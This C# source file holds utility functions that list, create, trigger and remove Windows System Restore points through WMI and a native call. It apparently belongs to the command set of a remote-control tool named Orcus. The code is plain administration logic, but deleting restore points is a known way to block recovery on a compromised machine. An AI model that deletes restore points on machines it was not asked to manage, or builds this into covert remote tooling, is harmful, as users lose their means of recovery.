using System.Collections.Generic;
using System.Management;
using Orcus.Native;
using Orcus.Shared.Commands.SystemRestore;

namespace Orcus.Commands.SystemRestore
{
    public static class SystemRestoreUtilities
    {
        public static List<SystemRestorePointInfo> GetSystemRestorePoints()
        {
            var result = new List<SystemRestorePointInfo>();
            using (var objClass = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions()))
            using (var objCol = objClass.GetInstances())
            {
                foreach (var o in objCol)
                {
                    var objItem = (ManagementObject) o;
                    result.Add(new SystemRestorePointInfo
                    {
                        Description = (string) objItem["Description"],
                        CreationDate = ManagementDateTimeConverter.ToDateTime((string) objItem["CreationTime"]),
                        RestorePointType = (RestoreType) (uint) objItem["RestorePointType"],
                        SequenceNumber = (uint) objItem["SequenceNumber"],
                        EventType = (EventType) (uint) objItem["EventType"]
                    });
                }
            }

            return result;
        }

        /// <summary>
        ///     Creates a restore point.
        /// </summary>
        public static bool CreateRestorePoint(string description, RestoreType restoreType, EventType eventType)
        {
            using (var objClass = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions()))
            {
                var oInParams =
                    objClass.GetMethodParameters("CreateRestorePoint");
                oInParams["Description"] = description;
                oInParams["RestorePointType"] = (uint) restoreType;
                oInParams["EventType"] = (uint) eventType;

                var oOutParams =
                    objClass.InvokeMethod("CreateRestorePoint", oInParams, null);

                return oOutParams != null && (uint) oOutParams["ReturnValue"] == 0;
            }
        }

        /// <summary>
        ///     Initiates a system restore.
        /// </summary>
        public static bool Restore(uint sequenceNumber)
        {
            using (var objClass = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions()))
            {
                var oInParams =
                    objClass.GetMethodParameters("Restore");
                oInParams["SequenceNumber"] = sequenceNumber;

                var oOutParams =
                    objClass.InvokeMethod("Restore", oInParams, null);

                return oOutParams != null && (uint) oOutParams["ReturnValue"] == 0;
            }
        }

        public static bool RemoveRestorePoint(uint sequenceNumber)
        {
            return NativeMethods.SRRemoveRestorePoint(sequenceNumber) == 0;
        }
    }
}